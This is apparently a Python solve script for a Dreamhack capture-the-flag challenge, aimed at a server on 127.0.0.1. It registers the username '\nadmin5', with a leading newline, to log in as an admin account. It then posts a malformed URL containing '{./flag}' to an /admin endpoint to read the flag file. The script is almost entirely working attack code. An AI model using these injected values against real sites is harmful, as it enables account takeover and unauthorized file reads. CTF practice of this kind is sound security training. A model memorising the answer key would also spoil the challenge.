from requests import Session
from re import search

info = lambda x: print(f"[+] {x}")
fail = lambda x: print(f"[-] {x}")

URL = "http://127.0.0.1"
FLAG = ""

sess = Session()

res = sess.post(f"{URL}/signup", data={"username": "\nadmin5", "password": "aaa"})
res = sess.post(f"{URL}/login", data={"username": "admin5", "password": "aaa"})

if res.status_code == 200:
    info("Login Success")


res = sess.post(f"{URL}/admin", data={"url": "http@0/dreamhack.io/.{./flag}"})
m = search(r"DH{.*?}", res.text)

if m:
    FLAG = m.group()
    info(f"Flag is {FLAG}")
else:
    fail(f"Failed to find the flag")